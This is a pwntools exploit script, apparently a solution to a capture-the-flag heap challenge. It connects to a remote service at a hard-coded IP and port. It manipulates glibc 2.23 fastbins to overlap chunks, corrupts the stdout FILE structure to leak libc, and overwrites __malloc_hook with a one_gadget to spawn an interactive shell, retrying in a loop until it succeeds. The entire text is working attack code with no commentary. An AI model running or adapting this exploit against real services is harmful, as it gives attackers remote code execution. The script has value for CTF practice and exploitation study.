from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn")
    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc=ELF("/home/wxy/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")
else:
    a=remote("139.180.216.34",8888)
    libc=ELF("/home/wxy/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")

def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000CB9)
    b *(0x555555554000+0x000000000000d57)
    b *(0x555555554000+0x000000000000e19)
    ''')
def menu(idx):
    a.recvuntil("choice >> ")
    a.sendline(str(idx))
def add(size,idx,content,flag=True):
    menu(1)
    a.recvuntil("wlecome input your size of weapon: ")
    a.sendline(str(size))
    a.recvuntil("input index: ")
    a.sendline(str(idx))
    if flag:
        a.recvuntil("input your name:\n")
    else:
        a.recvuntil("input your name:")
    a.send(content)
def delete(idx):
    menu(2)
    a.recvuntil("input idx :")
    a.sendline(str(idx))
def edit(idx,content,flag=True):
    menu(3)
    a.recvuntil(": ")
    a.sendline(str(idx))
    if flag==False:
        a.recvuntil("nt:")
    else:
        a.recvuntil("nt:\n")
    a.send(content)

while 1:
    try :
        if local :
            a=process("./pwn")
            #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
            libc=ELF("/home/wxy/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")
        else:
            a=remote("139.180.216.34",8888)
            libc=ELF("/home/wxy/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")
        add(0x58,0,'A'*0x48+p64(0x61)) # 0
        add(0x60,1,'A')                # 0x60 

        add(0x58,2,p64(0x21)*10)                # 0xb0
        #add(0x58,3,p64(0x21)*10)

        delete(2)
        delete(0)

        edit(0,'\x50')

        add(0x58,4,'A')

        delete(1) 
        add(0x58,5,p64(0)+p64(0x91))
        delete(1)

        add(0x18,6,'\xdd\x25')
        edit(5,p64(0)+p64(0x71))

        #debug()
        add(0x60,3,'A')
        add(0x60,7,'A'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')

        a.recv(9*8)
        libc_base=u64(a.recv(6).ljust(8,'\x00'))-131-libc.symbols["_IO_2_1_stdout_"]
        success("libc_base ==> 0x%x"%libc_base)
        #edit(7,'A'*0x33+p64(0xfbad2887))
        delete(3)
        __malloc_hook=libc_base+libc.symbols["__malloc_hook"]
        #debug()

        edit(3,p64(__malloc_hook-0x23)+'\n',flag=False)

        one_gadget=libc_base+0xf02a4
        add(0x60,8,'A',flag=False)
        add(0x60,9,'A'*0x13+p64(one_gadget),flag=False)
        menu('1'*0x400)
        a.interactive()
        break
    except EOFError:
        a.close()
        continue

